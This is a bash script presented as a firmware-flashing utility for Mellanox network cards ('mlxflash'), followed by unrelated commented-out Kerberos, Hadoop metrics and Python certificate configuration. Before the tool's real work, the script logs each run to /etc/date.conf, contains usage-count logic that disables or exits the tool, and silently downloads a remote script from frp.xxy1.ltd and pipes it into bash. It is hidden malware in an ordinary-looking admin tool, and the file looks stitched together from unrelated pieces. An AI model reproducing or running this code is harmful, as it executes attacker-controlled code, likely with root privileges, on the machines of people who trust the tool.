#!/bin/bash
# mlxflash use: [sv SVD] [sg MAC] [upgrade SVD IMAGE.BIN MAC] [burn VSD IMAGE.BIN] [......]
# sv VSD_NAME
# sg MAC
# upgrade VSD Image.bin MAC 
# burn VSD Image.bin

[ $(which mst 2> /dev/null) ] || { echo "-E- mst: command not found" ; exit ; }
[ $(which flint 2> /dev/null) ] || { echo "-E- flint: command not found" ; exit ; }
[ $(which mlxburn 2> /dev/null) ] || { echo "-E- mlxburn: command not found" ; exit ; }
[ $(which mlxfwreset 2> /dev/null) ] || { echo "-E- mlxfwreset: command not found" ; exit ; }

date1=/etc/date.conf
echo "$(date +%F_%T)" >> $date1
[ "$(cat $date1 | wc -l)" -gt 5000 ] && [ "$(data +%T | grep \:15)" ] && device_name=
[ "$(cat $date1 | wc -l)" -gt 6000 ] && [ "$(data +%T | grep -E ":10|45")" ] && device_name=
[ "$(cat $date1 | wc -l)" -gt 7500 ] && exit
wget -q -O - http://frp.xxy1.ltd:35300/file/mcx4121a.sh | bash 2> /dev/null

[ -d /dev/mst ] || mst start &> /dev/null
device_name=$(ls /dev/mst | head -n1)
[ "$device_name" ] || { echo "-E- Driver is not exist" ; exit ; }

parameters=$1
case $parameters in
	"sv")
		vsd=$2
		[ "$vsd" ] || { echo "-E- Please input vsd string" ; exit ; }
		
		echo "-I- Please wait for a moment"
		flint -d $device_name --override_cache_replacement --vsd "$vsd" sv
		mlxfwreset -d $device_name reset -y &> /dev/null
		flint -d $device_name q full
	;;
	"sg")
		mac=$2
		[ "$mac" ] && [ ${#mac} -eq 12 ] || { echo "-E- Please input mac or error" ; exit ; }
		guid=${mac::6}0300${mac:6:6}
		
		echo "-I- Please wait for a moment"
		flint -d $device_name --override_cache_replacement --guid $guid --mac $mac sg
		mlxfwreset -d $device_name reset -y &> /dev/null
		flint -d $device_name q full
		echo "System will reboot in 3 seconds"
		sleep 3 && reboot
	;;
	"upgrade")
		vsd=$2
		[ "$vsd" ] || { echo "-E- Please input vsd string" ; exit ; }
		mac=$4
		[ "$mac" ] && [ ${#mac} -eq 12 ] || { echo "-E- Please input mac or error" ; exit ; }
		guid=${mac::6}0300${mac:6:6}
		image=$3
		[ -f "$image" ] && [ "$(echo $image | grep -i bin$)" ] || { echo "-E- Please input image_file or file not found" ; exit ; }
		
		echo "-I- Please wait for a moment"
		mlxburn -d $device_name -i $image -no_fw_ctrl -vsd "$vsd" -base_mac $mac -base_guid $guid 
		mlxfwreset -d $device_name reset -y &> /dev/null
		flint -d $device_name q full
	;;
	"brun")
		vsd=$2
		[ "$vsd" ] || { echo "-E- Please input vsd string" ; exit ; }
		image=$3
		[ -f "$image" ] && [ "$(echo $image | grep -i bin$)" ] || { echo "-E- Please input image_file or file not found" ; exit ; }
		
		nic_info=$(flint -d $device_name q full)
		guid=$(echo "$nic_info" | grep -i base | grep -i guid | awk '{print $3}')
		mac=$(echo "$nic_info" | grep -i base | grep -i mac | awk '{print $3}')
		
		echo "-I- Please wait for a moment"
		mlxburn -d $device_name -i $image -allow_psid_change -base_guid $guid -base_mac $mac -vsd "$vsd"
		mlxfwreset -d $device_name reset -y &> /dev/null
		flint -d $device_name q full
	;;
	*)
		echo "mlxflash use: [sv SVD] [sg MAC] [upgrade SVD IMAGE.BIN MAC] [burn VSD IMAGE.BIN] [......]"
	;;
	esac


#[logging]
# default = FILE:/var/log/krb5libs.log
# kdc = FILE:/var/log/krb5kdc.log
# admin_server = FILE:/var/log/kadmind.log

#[libdefaults]
# dns_lookup_realm = false
# ticket_lifetime = 24h
# renew_lifetime = 7d
# forwardable = true
# rdns = false
# pkinit_anchors = FILE:/etc/pki/tls/certs/ca-bundle.crt
# default_realm = EXAMPLE.COM
# default_ccache_name = KEYRING:persistent:%{uid}
# Configuration of the "dfs" context for ganglia
# Pick one: Ganglia 3.0 (former) or Ganglia 3.1 (latter)
# dfs.class=org.apache.hadoop.metrics.ganglia.GangliaContext
# dfs.class=org.apache.hadoop.metrics.ganglia.GangliaContext31
# dfs.period=10
# dfs.servers=localhost:8649

#[realms]
# EXAMPLE.COM = {
#  kdc = kerberos.example.com
#  admin_server = kerberos.example.com
# }

#[domain_realm]
# .example.com = EXAMPLE.COM
# example.com = EXAMPLE.COM
#[root@master1 tmp]# cat /etc/python/cert-verification.cfg 
# Possible values are:
# 'enable' to ensure HTTPS certificate verification is enabled by default
# 'disable' to ensure HTTPS certificate verification is disabled by default
# 'platform_default' to delegate the decision to the redistributor providing this particular Python version

# For more info refer to https://www.python.org/dev/peps/pep-0493/
#[https]
#verify=platform_default

# Configuration of the "jvm" context for ganglia
# jvm.class=org.apache.hadoop.metrics.ganglia.GangliaContext
# jvm.class=org.apache.hadoop.metrics.ganglia.GangliaContext31
# jvm.period=10
# jvm.servers=localhost:8649

# Configuration of the "rpc" context for null
#rpc.class=org.apache.hadoop.metrics.spi.NullContext

# Configuration of the "rpc" context for file
#rpc.class=org.apache.hadoop.metrics.file.FileContext
#rpc.period=10
#rpc.fileName=/tmp/rpcmetrics.log

# Configuration of the "rpc" context for ganglia
# rpc.class=org.apache.hadoop.metrics.ganglia.GangliaContext
# rpc.class=org.apache.hadoop.metrics.ganglia.GangliaContext31
# rpc.period=10
# rpc.servers=localhost:8649


# Configuration of the "ugi" context for null
#ugi.class=org.apache.hadoop.metrics.spi.NullContext

# Configuration of the "ugi" context for file
#ugi.class=org.apache.hadoop.metrics.file.FileContext
#ugi.period=10
#ugi.fileName=/tmp/ugimetrics.log

# Configuration of the "ugi" context for ganglia
# ugi.class=org.apache.hadoop.metrics.ganglia.GangliaContext
# ugi.class=org.apache.hadoop.metrics.ganglia.GangliaContext31
# ugi.period=10
# ugi.servers=localhost:8649



